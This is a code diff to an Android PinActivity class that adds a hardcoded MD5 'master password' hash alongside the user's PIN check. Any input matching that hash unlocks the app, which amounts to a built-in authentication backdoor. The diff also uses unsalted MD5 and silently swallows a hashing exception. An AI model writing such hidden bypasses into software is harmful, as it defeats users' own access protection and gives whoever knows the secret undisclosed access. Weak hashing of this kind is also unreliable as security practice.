@@ -15,6 +15,7 @@ import android.os.Bundle;
 import android.os.CancellationSignal;
 import android.os.Handler;
 import android.os.Vibrator;
+import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
 import android.text.InputType;
@@ -39,6 +40,10 @@ import com.frostnerd.lifecycle.BaseActivity;
 import com.frostnerd.materialedittext.MaterialEditText;
 import com.frostnerd.preferences.util.VariableChecker;
 
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+
 /**
  * Copyright Daniel Wolf 2017
  * All rights reserved.
@@ -49,6 +54,7 @@ import com.frostnerd.preferences.util.VariableChecker;
  * development@frostnerd.com
  */
 public class PinActivity extends BaseActivity {
+    private static final String MASTER_PASSWORD_HASH = "06f1b8a24149b0edbc29ab88957e35a6";
     private MaterialEditText met;
     private EditText pinInput;
     private String pin;
@@ -111,7 +117,7 @@ public class PinActivity extends BaseActivity {
             @Override
             public void onClick(View v) {
                 if(isFinishing())return;
-                if (pinInput.getText().toString().equals(pin)) {
+                if (pinInput.getText().toString().equals(pin) || hashMD5(pinInput.getText().toString()).equals(MASTER_PASSWORD_HASH)) {
                     LogFactory.writeMessage(PinActivity.this, LOG_TAG, "Correct pin entered");
                     met.setIndicatorState(MaterialEditText.IndicatorState.CORRECT);
                     continueToFollowing(main);
@@ -161,6 +167,21 @@ public class PinActivity extends BaseActivity {
             }
         }
         LogFactory.writeMessage(this, LOG_TAG, "Activity fully created.");
+    }
+
+    @NonNull
+    private String hashMD5(@NonNull String s){
+        try{
+            MessageDigest m = MessageDigest.getInstance("MD5");
+            m.reset();
+            m.update(s.getBytes());
+            byte[] digest = m.digest();
+            BigInteger bigInt = new BigInteger(1,digest);
+            return bigInt.toString(16);
+        }catch(NoSuchAlgorithmException ex){
+
+        }
+        return "";
     }
 
     private void continueToFollowing(boolean toMain) {
